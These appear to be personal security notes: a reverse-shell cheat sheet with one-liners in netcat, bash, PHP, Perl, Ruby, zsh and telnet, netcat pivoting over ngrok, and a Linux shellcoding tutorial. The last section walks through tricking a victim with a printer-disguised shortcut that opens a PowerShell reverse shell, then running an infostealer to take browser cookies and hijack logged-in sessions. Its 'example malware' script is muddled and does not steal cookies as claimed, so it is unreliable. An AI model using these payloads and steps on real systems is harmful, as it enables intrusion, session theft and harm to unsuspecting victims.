---
created: 2024-06-28T03:40
updated: 2024-12-12T23:57
---

# Reverse Shell Cheat Sheet: Creating and Using Reverse Shells for Penetration Testing and Security Research

![[Pasted image 20241103123625.png]]


resource: [Reverse Shell Cheat Sheet: Creating and Using Reverse Shells for Penetration Testing and Security Research | by Cuncis | Medium](https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e)

### How Does a Reverse Shell Work?

A reverse shell works by establishing a connection between the target machine and the attacker’s machine. This connection is typically initiated by the target machine, which sends a request to the attacker’s machine to establish a connection. Once the connection is established, the attacker’s machine acts as a listener, waiting for commands to be sent by the attacker.

To create a reverse shell, the attacker first needs to create a shell payload that is designed to connect back to the attacker’s machine. This can be done using a variety of tools and programming languages, such as Netcat, Python, or Metasploit. Once the payload is created, it is typically uploaded to the target machine using a vulnerability or social engineering tactics.

Once the payload is executed on the target machine, it establishes a connection back to the attacker’s machine. This connection can be encrypted to prevent detection and can use a variety of protocols, such as TCP, UDP, or HTTP. Once the connection is established, the attacker can use the shell session to execute commands on the target machine, access files and data, and even escalate privileges if necessary.

! ATTENTION!  **Antivirus flags the reverse shell commands! so don't type anything or the file will be deleted completely** 

## NETCAT


```
nc -e /bin/sh <attacker IP> <attacker port>
```


## BASH

```
bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
```


## PYTHON


![[Pasted image 20240628034640.png]]


## PHP

```
php -r '$sock=fsockopen("<attacker IP>",<attacker port>);exec("/bin/sh -i <&3 >&3 2>&3");'

```

## ZSH

```
zsh -c 'zmodload zsh/net/tcp && ztcp <attacker IP> <attacker port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

## Powershell

!<mark style="background: #FF5582A6;"> Powershell reverse shell gets flagged by Windows AV and could delete the file</mark>

Part 1 of the code:

![[Pasted image 20240628041137.png]]

Part 2:

![[Pasted image 20240628041157.png]]

Part 3:

![[Pasted image 20240628041217.png]]

Part 4:

![[Pasted image 20240628041234.png]]

Part 5:

![[Pasted image 20240628041251.png]]

Part 6:

![[Pasted image 20240628041324.png]]

Part 7:

![[Pasted image 20240628041335.png]]

## Perl

```
perl -e 'use Socket;$i="$ENV{<attacker IP>}";$p=$ENV{<attacker port>};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby


```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["<attacker IP>"],ENV["<attacker port>"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```


## Telnet

```
TF=$(mktemp -u); mkfifo $TF && telnet <attacker IP> <attacker port> 0<$TF | /bin sh 1>$TF
```


## Using a Reverse Shell

Once you have created a reverse shell payload and established a connection to the target machine, you can use the shell session to execute commands and perform various actions on the target machine. Here are some useful commands and techniques:

## Basic Commands

- `pwd`: Print current working directory.
- `ls`: List contents of current directory.
- `cd`: Change current directory.
- `cat`: Display contents of a file.
- `rm`: Remove a file or directory.
- `mkdir`: Create a new directory.
- `cp`: Copy a file or directory.
- `mv`: Move a file or directory.

# Privilege Escalation

- `sudo -l`: List available sudo commands for the current user.
- `sudo <command>`: Run a command with elevated privileges.
- `su`: Switch to the root user.
- `sudo su`: Switch to the root user with elevated privileges.

# File Transfer

- `wget <file URL>`: Download a file from the internet.
- `curl <file URL>`: Download a file from the internet.
- `nc -l <local port> > <file>`: Receive a file over the network using netcat.
- `nc <target IP> <target port> < <file>`: Send a file over the network using netcat.

# Network Enumeration

- `ifconfig`: Display network interface information.
- `netstat -tulpn`: List active network connections.
- `arp -a`: Display ARP table.
- `ping <target IP>`: Test network connectivity to a target.
- `nmap`: Scan a network for open ports and services.

This is a basic cheat sheet for creating and using reverse shells

---



### Netcat: Bind Reverse Shell


> Netcat bind reverse shell allows remote access by binding a shell to a network port, enabling connections from an external machine

```

 Table of Content: 1. Basic Netcat: Chat 2. Basic Netcat: Transfer File 3. Basic Netcat: Port Scaning 4. Netcat: Bind Reverse Shell 5. Netcat: Pivoting 6. Netcat: Ngrok


```

### 1. Basic Netcat: Chat

![None](https://miro.medium.com/v2/resize:fit:700/1*lTEkRsmv1GddUNe5RJrT5Q.png)

Netcat Reverse

![None](https://miro.medium.com/v2/resize:fit:700/1*yAV7WticKeSHk3ImkeQ2GA.png)

				Chat Communication


```
Attacker: nc -nvlp 443 
Web: nc 192.168.100.188 443
```

![None](https://miro.medium.com/v2/resize:fit:700/1*VAoHQDJMloGYESzKV2Sntg.png)

					Netcat Bind

### 2. Basic Netcat: Transfer File

![None](https://miro.medium.com/v2/resize:fit:700/1*W2VoG34J-ijwMJlrra-uxg.png)

			Netcat Reverse: Transfer File from Web to Attacker

```
Attacker: nc -nvlp 443 > file.txt 
cat file.txt 

Web: echo "netcat transfer" > file.txt 
nc 192.168.100.188 443 < file.txt
```

### Netcat: Bind Reverse Shell

![None](https://miro.medium.com/v2/resize:fit:700/1*rp4QYgS5iLU0Qlz3TPcKTw.png)

						Netcat Reverse Shell

![None](https://miro.medium.com/v2/resize:fit:700/1*EosjkH5IckW0KLtyDK5svg.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*xz7XnWnnwJ3tTKcMjudY7g.png)

						Netcat Bind Shell

```
Attacker: nc -nvlp 443 
Web: nc 192.168.100.188 443 -e /bin/sh
```

```
Web: nc -lnvp 443 -e /bin/sh 
Attacker: nc 192.168.100.190 4444 

# Install Netcat: wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz tar -xzvf netcat-0.7.1.tar.gz 
cd netcat-0.7.1 
./configure 
make
make install
```

### Netcat: Pivoting

![None](https://miro.medium.com/v2/resize:fit:700/1*4iOq3Akf60vOhEvImfejWg.png)

						Attacker will take over the db shell

![None](https://miro.medium.com/v2/resize:fit:700/1*jCZthAOXPdsSbEhOGj8wqQ.png)

						Netcat Pivoting

```
Attacker: nc -lnvp 443 
Web: nc 192.168.100.188 443 -e "nc 192.168.100.189 8888" 
Db: nc -nlvp 8888 -e /bin/sh
```

### Netcat: Ngrok

![None](https://miro.medium.com/v2/resize:fit:700/0*JcZfzYS7uGh9dOQt.jpeg)

					How to work ngrok

```
# Install Ngrok 1. 
Register ngrok.com 2. Install ngrok on Kali:
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc \ 
| sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \ && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \ 
| sudo tee /etc/apt/sources.list.d/ngrok.list \ 
&& sudo apt update \ 
&& sudo apt install ngrok 

3. Setup token: ngrok config add-authtoken <get-token-from-ngrok.com>
```

![None](https://miro.medium.com/v2/resize:fit:700/1*FWTsQj29eeZY1ohWVcIyfQ.png)

					Ngrok: Netcat Reverse Shell

```
Attacker: ngrok tcp 443 -> 0.tcp.ap.ngrok.io:19036
nc -nvlp 443

Web: nc 0.tcp.ap.ngrok.io 19036 -e /bin/sh
```

![None](https://miro.medium.com/v2/resize:fit:700/1*xRCXgrVh346bME5lD4-y3g.png)

					Ngrok: Transfer File

```
Attacker: ngrok http 8080 -> https://2d90-103-144-45-243.ngrok-free.app 
touch file-kali.txt
python3 -m http.server 8080 
Web: wget https://2d90-103-144-45-243.ngrok-free.app/file-kali.txt 
ls file-kali.txt
```

---

##  Linux Shellcoding

#source: [Linux Shellcoding. “Linux Shellcoding for Security… | by RED TEAM | Jul, 2024 | Medium](https://sid4hack.medium.com/linux-shellcoding-9ce073353011)

## shellcode

Writing shellcode is a great way to learn more about assembly language and how a program interacts with the operating system.


![[{281A300D-FF58-420C-BA24-EBA33D2F30B0} 1.png]]

		example of a shellcode

Why do red teamers and penetration testers write shellcode? Because in real situations, shellcode can be injected into a running program to make it do something it wasn’t designed to do, such as buffer overflow attacks.

Therefore, shellcode is often used as the “payload” in an exploit.

Why is it called “shellcode”? Historically, shellcode is machine code that, when executed, opens a shell.

**Shellcode plays a crucial role in penetration testing and red teaming for several reasons:**

1. **Understanding Low-Level Operations**: Writing shellcode requires a deep understanding of assembly language and how programs interact with the operating system at a low level.
2. **Payload for Exploits :** Shellcode is often used as the payload in exploits. When a vulnerability <mark style="background: #FF5582A6;">such as a buffer overflow is exploited, shellcode can be injected into a running process to execute arbitrary commands.</mark>
3. **Evasion and Obfuscation**: Crafting effective shellcode involves techniques to evade detection by antivirus and intrusion detection systems.
4. **Advanced Post-Exploitation**: Beyond simply spawning a shell, modern shellcode can be designed to perform complex post-exploitation tasks.
5. **Versatility**: Modern shellcode is not limited to spawning shells. It can be crafted to perform a wide range of actions, such as downloading additional malware, creating backdoors.

## Shellcode Testing

When testing shellcode, it’s convenient to simply insert it into a program and execute it.

The following C program (run.c) will be used to test all our code:

![](https://miro.medium.com/v2/resize:fit:875/1*lf_1EjL6mBuA5DWtVAjE-w.jpeg)
						run.c

A strong understanding of C and Assembly is highly recommended. Additionally, knowing how the stack operates is a significant advantage.

## Disable ASLR

Address Space Layout Randomization (ASLR) is a security measure implemented in most contemporary operating systems. It alters the memory addresses utilized by programs, including the stack, heap, and libraries, making it more difficult for attackers to exploit vulnerabilities. In Linux, ASLR can be configured using the 

```
/proc/sys/kernel/randomize_va_space file.
```

**Address Space Layout Randomization** (ASLR) security feature that makes it more difficult for attackers to predict the location of specific functions or memory addresses, thus mitigating certain types of attacks

**The following values are supported:**

0 — no randomization, Everything is static.

1 — conservative randomization, Shared libraries, stack, mmap(), VDSO, and heap are randomized.

2 — full randomization

To check the current ASLR setting, you can use the following command:

```
cat /proc/sys/kernel/randomize_va_space
```

To disable ASLR, run:

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

To enable ASLR, run:

```
echo 2 > /proc/sys/kernel/randomize_va_space
```

## Assembly

The x86 Intel Register Set.

EAX, EBX, ECX, and EDX are all 32-bit general-purpose registers.

AH, BH, CH, and DH access the upper 16 bits of these general-purpose registers, while AL, BL, CL, and DL access the lower 8 bits.

EAX, AX, AH, and AL are referred to as “Accumulator” registers and can be utilized for I/O port access, arithmetic operations, interrupt calls, etc. These registers are also useful for implementing system calls.

EBX, BX, BH, and BL are known as “Base” registers, serving as base pointers for memory access. This register is commonly used to store pointers for system call arguments and sometimes to store the return value from an interrupt.

ECX, CX, CH, and CL are called “Counter” registers.

EDX, DX, DH, and DL are known as “Data” registers and can be employed for I/O port access, arithmetic operations, and certain interrupt calls.

Assembly instructions. There are some instructions that are important in assembly programming:

```
mov eax, 32 ; assign: eax = 32  
xor eax, eax ; exclusive OR  
push eax ; push something onto the stack  
pop ebx ; pop something from the stack  
; (what was on the stack in a register/variable)  
call mysuperfunc ; call a function  
int 0x80 ; interrupt, kernel command
```

A comprehensive list of x86 system calls can be found in `/usr/include/asm/unistd_32.h`.

**Example of how libc wraps syscalls:**

![](https://miro.medium.com/v2/resize:fit:875/1*S7KsWvvJ03c6QBgrcE5FHQ.jpeg)

Let’s compile and disassembly:

```
gcc -masm=intel -static -m32 -o exit0 exit0.c
```

```
gdb -q ./exit0
```

![](https://miro.medium.com/v2/resize:fit:875/1*HPuGDkFzqPDUBXErebssCw.jpeg)

0xfc = exit_group() and 0x1 = exit()


## Nullbytes

Let’s go to investigate simple program:

![](https://miro.medium.com/v2/resize:fit:875/1*vcaSa-XL4869ve5n5q2sjQ.jpeg)

## compile and run:

```
gcc -m32 -w -o woow woow.c

./woow
```

![](https://miro.medium.com/v2/resize:fit:1250/1*PhGwWHBaTQg2RhGxGWvwGg.jpeg)

When delivering shellcode for exploits targeting C code, null bytes (\x00) must be avoided<mark style="background: #FF5582A6;"> because they terminate the instruction chain.</mark> This is crucial since shellcode is often included in NUL-terminated strings. If the shellcode contains null bytes, <mark style="background: #FFB86CA6;">the C code being exploited may ignore and discard any subsequent code starting from the first null byte.</mark>

This challenge is specifically related to machine code. For example, to invoke a system call with the number 0xb, you need to set the EAX register to 0xb without using machine code that includes null bytes.

## Avoid null bytes (\x00) in shellcode for C code exploits, as they prematurely terminate the code, causing the rest to be ignored.


Let’s go to compile and run two equivalent code.

First exit1.asm:

![](https://miro.medium.com/v2/resize:fit:875/1*JpvjMUjAsgxft-S783EWuw.jpeg)


compile and investigate exit1.asm:

```
nasm -f elf32 -o exit1.o exit1.asm  
ld -m elf_i386 -o exit1 exit1.o  
./exit1  
objdump -M intel -d exit1
```

![[Pasted image 20240722155130.png]]

1. **`nasm -f elf32 -o exit1.o exit1.asm`**:
    
    - **`nasm`**: Invokes the Netwide Assembler.
    - **`-f elf32`**: Specifies the output format as 32-bit ELF.
    - **`-o exit1.o`**: Names the output file `exit1.o`.
    - **`exit1.asm`**: The source assembly file to be assembled.
2. **`ld -m elf_i386 -o exit1 exit1.o`**:
    
    - **`ld`**: Calls the GNU linker.
    - **`-m elf_i386`**: Specifies the linking format for 32-bit systems.
    - **`-o exit1`**: Names the final executable `exit1`.
    - **`exit1.o`**: The object file to be linked.
- **Disassembly Section**:

- Shows the machine code translated back into assembly instructions, such as `mov eax,0x0` and `int 0x80`


as you can see we have a zero bytes in the machine code.

**Next exit2.asm:**

![](https://miro.medium.com/v2/resize:fit:875/1*9o1QVWLTb6JMiQeZz7LVnQ.jpeg)

compile and investigate exit2.asm:

```
nasm -f elf32 -o exit2.o exit2.asm  
ld -m elf_i386 -o exit2 exit2.o  
./exit2  
objdump -M intel -d exit2
```

![](https://miro.medium.com/v2/resize:fit:1250/1*ZwB9MA07SgYl6A4lTg436w.jpeg)

As you can see, there are no embedded zero bytes in it.

The EAX register in a computer’s CPU can be split into smaller parts: AX, AH, and AL. AX is the lower half of EAX, AL is the lower quarter, and AH is the upper quarter of that lower half.

Using the smaller parts of the register can help us do this. For example, using `mov al, 0x1` changes just a small part of EAX and avoids creating a null byte, unlike `mov eax, 0x1`, which could create unwanted null bytes in our code.

- **EAX** is a 32-bit register.
- **AX** is the lower 16 bits of EAX.
- **AL** is the lower 8 bits of AX (which means it’s also part of EAX).
- **AH** is the upper 8 bits of AX.

Both these programs are functionally equivalent.

## Normal exit

Let’s begin with simplest example. Let’s use our exit.asm code as the first example for shellcoding (example1.asm):

Extract byte code:

![](https://miro.medium.com/v2/resize:fit:1250/1*UiaJOAC4qxNIceNWmx0gHw.jpeg)

Here is how it looks like in hexadecimal.

So, the bytes we need are 31 c0 b0 01 cd 80. Replace the code at the top (run.c) with:

![](https://miro.medium.com/v2/resize:fit:875/1*gnB4CsCXGLX3YGer10LiyQ.jpeg)

Now, compile and run:

```
gcc -z execstack -m32 -o run run.c  
./run  
echo $?
```

![](https://miro.medium.com/v2/resize:fit:1250/1*9lVx_tZtHCzArXJe7iU_sg.jpeg)

-z execstack Turn off the NX protection to make the stack executable

Our program returned 0 instead of 1, so our shellcode worked.

## Spawning a linux shell.

Let’s go to writing a simple shellcode that spawns a shell (example2.asm):

  
![](https://miro.medium.com/v2/resize:fit:1250/1*0vGaXP7-V9RqI9MVw1e-yw.jpeg)

To compile it use the following commands:

```
nasm -f elf32 -o example2.o example2.asm  
ld -m elf_i386 -o example2 example2.o  
./example2
```

![](https://miro.medium.com/v2/resize:fit:1250/1*ChMJcB-Y9peTdf5jpR-w-g.jpeg)

Using `system("/bin/sh")` would be a straightforward approach, but it has a drawback: `system` drops the user's privileges.

Instead, we can use `execve`, which is a bit more complex but doesn’t have this issue. `execve` needs three pieces of information:

1. **The program to run** (this goes into the EBX register),
2. **Arguments for the program** (this goes into the ECX register, which can be `null` if there are no arguments),
3. **Environment variables** (this goes into the EDX register, which can also be `null` if not needed).

![](https://miro.medium.com/v2/resize:fit:1250/1*-e_9TZTxE-nu0NCmCUSqaQ.jpeg)

Now, let’s assemble it and check if it properly works and does not contain any null bytes:

  
![](https://miro.medium.com/v2/resize:fit:1250/1*E-4d8ClasNV6vFxRtnVSyQ.jpeg)

Then, extract byte code via some bash hacking and objdump:


```
objdump -d ./example3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

![](https://miro.medium.com/v2/resize:fit:1250/1*KfH-G0UwTguwomD1vvyHRw.jpeg)

So, our shellcode is:

![](https://miro.medium.com/v2/resize:fit:1250/1*lnDtrA8Z5R0K_qItmS3nVw.jpeg)

Then, replace the code at the top (run.c) with:

![](https://miro.medium.com/v2/resize:fit:1250/1*Vx1A6XCd2F8LssHwjlkHrg.jpeg)

Compile and run:

gcc -z execstack -m32 -o run run.c  
./run

![](https://miro.medium.com/v2/resize:fit:1250/1*v-FNHbj3yipQPLJPHIKb8g.jpeg)

As you can see, everything work perfectly.

**Conclusion:**  
In malware development, shellcoding means creating small assembly programs that perform tasks like opening a command shell. This requires knowing how to write and manage code that directly interacts with the operating system while avoiding issues like null bytes that can break the code.

![](https://miro.medium.com/v2/resize:fit:1250/1*KfH-G0UwTguwomD1vvyHRw.jpeg)

So, our shellcode is:

![](https://miro.medium.com/v2/resize:fit:1250/1*lnDtrA8Z5R0K_qItmS3nVw.jpeg)

Then, replace the code at the top (run.c) with:

![](https://miro.medium.com/v2/resize:fit:1250/1*Vx1A6XCd2F8LssHwjlkHrg.jpeg)

Compile and run:

```
gcc -z execstack -m32 -o run run.c  
./run
```

![](https://miro.medium.com/v2/resize:fit:1250/1*v-FNHbj3yipQPLJPHIKb8g.jpeg)

As you can see, everything work perfectly.

**Conclusion:**  
In malware development, shellcoding means creating small assembly programs that perform tasks like opening a command shell. This requires knowing how to write and manage code that directly interacts with the operating system while avoiding issues like null bytes that can break the code.

---


anatomy of a reverse shell:

https://www.youtube.com/watch?v=Z3EOEsu7ymc --to do


https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

[How to Write Shellcode for Shellcode Injection and Simplify Assembly Code Development | by muchi | Medium](https://medium.com/@muchiemma/how-to-write-shellcode-for-shellcode-injection-and-simplify-assembly-code-development-703c3f214c46)

[Introduction to Linux shellcode writing (Part 1) – Adventures in the programming jungle (adriancitu.com)](https://adriancitu.com/2015/08/31/introduction-to-linux-shellcode-writing-part-1/)

https://medium.com/@CJwrites154/mastering-shell-scripting-a-comprehensive-10-days-zero-to-hero-shell-scripting-challenge-series-33d570def6f6


---

#source: 

![[Pasted image 20240925134542.png]]


----

☢️ [Shellcode x64] Find and execute WinAPI functions with Assembly (https://print3m.github.io/blog/x64-winapi-shellcoding)

What you will learn:

-WinAPI function manual location with Assembly
-PEB Structure and PEB_LDR_DATA
-PE File Structure
-Relative Virtual Address calculation
-Export Address Table (EAT)
-Windows x64 calling-convention in practice
-Writing in Assembly like a real Giga-Chad...

#Article #Exploiting

☢️ https://github.com/Print3M/shellcodes/blob/main/calc-exe.asm


[Encoding Shellcode with Base64. Introduction | by Harsh Upadhyay | Medium](https://medium.com/@ninesage/encoding-shellcode-with-base64-ad4df9e0d5f1)

---


https://www.youtube.com/watch?v=wxslev_yha4

<iframe width="930" height="523" src="https://www.youtube.com/embed/wxslev_yha4" title="C# payload mastery 01 - simple C# shellcode loader" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

https://www.youtube.com/watch?v=jVTxKZKhvlo

<iframe width="930" height="523" src="https://www.youtube.com/embed/jVTxKZKhvlo" title="Executing shellcode in memory | Malware Development" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## Ransomware development

<iframe width="705" height="397" src="https://www.youtube.com/embed/EmPgF0zGAsQ" title="This malware will ENCRYPT your files!" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

find vuln with simple shell scripts: https://www.youtube.com/watch?v=IrbhyU-3H90



Loading BOF & ShellCode without executable permission
https://github.com/HackerCalico/No_X_BOF-ShellCode

Just a simple silly PoC demonstrating executable "exe" file that can be used like exe, dll or shellcode
https://github.com/Dump-GUY/EXE-or-DLL-or-ShellCode

dynamic HTTP/s Payload Stager that automates updating decryption variables, saving time and effort in managing shellcode loaders
https://github.com/WafflesExploits/Dynamic-HTTP-Payload-Stager


----

## make a reverse shell in the public internet:

make a reverse shell for your ip:

![[Pasted image 20241212225812.png]]

![[Pasted image 20241212225933.png]]

then paste the full reverse shell code:

![[Pasted image 20241212225916.png]]

Now host it, and publish out on the public internet:

![[Pasted image 20241212230035.png]]

## how to use it?:


![[Pasted image 20241212230555.png]]

make a windows shortcut with the powershell commands wich requests back the malicious ip:

![[Pasted image 20241212230453.png]]

![[Pasted image 20241212230422.png]]

and after that give it a name like for a printer along with the icon and run it on "minimized":

![[Pasted image 20241212230854.png]]

after the victim opens the file and you successfully log-in into the victim system:

![[Pasted image 20241212232832.png]]

Move into a valid directory and we can upload the info stealer:

![[Pasted image 20241212232808.png]]

Then download the file:

Add the malware file path with "iwk" command:

![[Pasted image 20241212233922.png]]

![[Pasted image 20241212233901.png]]

And add "iex" to execute all the powershell code for that infostealer malware:

![[Pasted image 20241212234015.png]]
![[Pasted image 20241212234109.png]]


copy all of that:

Then download: [Antidetect Browser for Multi Accounting, Try for Free | GoLogin.com](https://gologin.com/)

Go to the cookie section and paste the code:

![[Pasted image 20241212234736.png]]

![[Pasted image 20241212234453.png]]

And if you go to the specific domain where you fetched the cookies from, you should be already looged in:

![[Pasted image 20241212234834.png]]

An example code for the malware:   




```powershell
# Define the server URL (replace with your ngrok URL)
$serverUrl = "http://<your_ngrok_subdomain>.ngrok.io"

# Initialize the Netscape cookies string
$netscapeCookies = "Netscape HTTP Cookie File" + "`n"

# Function to fetch cookies from the server
function Get-CookiesFromServer {
    param (
        [string]$url
    )

    # Create a web request to the server
    $webRequest = [System.Net.WebRequest]::Create($url)
    $webRequest.Method = "GET"

    # Get the response
    $response = $webRequest.GetResponse()
    $cookies = $response.Headers["Set-Cookie"]

    # Parse the cookies and format them in Netscape format
    foreach ($cookie in $cookies) {
        $cookieParts = $cookie.Split(";")
        $cookieNameValue = $cookieParts[0].Split("=")
        $cookieName = $cookieNameValue[0]
        $cookieValue = $cookieNameValue[1]
        $hostname = "." + $url.Replace("http://", "").Replace("https://", "").Split("/")[0]
        $path = "/"
        $isSecure = if ($cookieParts -contains "Secure") { "TRUE" } else { "FALSE" }
        $expiry = "0"  # Set to 0 for session cookies

        $netscapeCookies += "$hostname`tFALSE`t$path`t$isSecure`t$expiry`t$cookieName`t$cookieValue`n"
    }

    # Close the response
    $response.Close()
}

# Fetch cookies from the server
Get-CookiesFromServer -url $serverUrl

# Fetch additional information from the file system
$additionalInfoFilePath = "path_to_your_additional_info_file.txt"
$additionalInfo = Get-Content $additionalInfoFilePath | ConvertFrom-StringData

# Output the cookies in Netscape format to a file
$outputFile = "firefox_cookies.txt"
$netscapeCookies | Out-File $outputFile -Encoding UTF8

# Output additional information to a file
$additionalInfoOutputFile = "additional_info.txt"
$additionalInfo | Out-File $additionalInfoOutputFile -Encoding UTF8

# Write output and error messages
Write-Output "Cookies have been exported to $outputFile"
Write-Output "Additional information has been exported to $additionalInfoOutputFile"
Write-Error "An error occurred while exporting cookies"

```
